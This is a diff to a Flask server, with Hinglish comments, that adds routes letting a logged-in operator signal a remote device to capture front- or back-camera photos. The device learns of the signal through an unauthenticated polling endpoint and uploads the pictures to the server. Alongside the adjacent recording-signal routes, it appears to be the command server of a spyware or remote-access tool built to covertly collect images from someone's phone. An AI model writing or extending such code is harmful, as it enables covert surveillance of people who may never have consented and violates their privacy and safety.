@@ -65,6 +65,73 @@ def dashboard():
     
     return render_template_string(DASHBOARD_HTML, files=files)
 
+
+# Camera routes - YE ADD KARO
+@app.route('/start-camera-signal', methods=['POST'])
+def start_camera_signal():
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    data = request.get_json()
+    camera_type = data.get('camera_type', 'front')  # 'front' or 'back'
+    
+    global camera_signal
+    camera_signal = {
+        'active': True,
+        'camera_type': camera_type,
+        'timestamp': time.time()
+    }
+    
+    print(f"Camera signal activated - {camera_type} camera")
+    return jsonify({'ok': True, 'message': f'{camera_type} camera signal sent'})
+
+@app.route('/check-camera-signal')
+def check_camera_signal():
+    global camera_signal
+    if camera_signal and camera_signal.get('active'):
+        # Signal 30 seconds tak valid rahega
+        if time.time() - camera_signal.get('timestamp', 0) < 30:
+            return jsonify({
+                'capture': True,
+                'camera_type': camera_signal.get('camera_type', 'front')
+            })
+    
+    camera_signal = {'active': False}
+    return jsonify({'capture': False})
+
+@app.route('/camera-signal-received', methods=['POST'])
+def camera_signal_received():
+    global camera_signal
+    camera_signal = {'active': False}
+    return jsonify({'ok': True})
+
+@app.route('/upload-photo', methods=['POST'])
+def upload_photo():
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    if 'photo' not in request.files:
+        return jsonify({'ok': False, 'error': 'No photo file'}), 400
+    
+    photo_file = request.files['photo']
+    if photo_file.filename == '':
+        return jsonify({'ok': False, 'error': 'No file selected'}), 400
+    
+    if photo_file:
+        timestamp = str(int(time.time()))
+        filename = f"camera_photo_{timestamp}.jpg"
+        
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        photo_file.save(filepath)
+        
+        print(f"✅ Photo uploaded: {filename}")
+        return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
+    
+    return jsonify({'ok': False, 'error': 'Upload failed'}), 500
+
+# Global variables mein yeh ADD karo
+camera_signal = {'active': False}
+
 # Recording signal routes
 # Recording signal routes - YE WALA USE KARO
 @app.route('/start-recording', methods=['POST'])
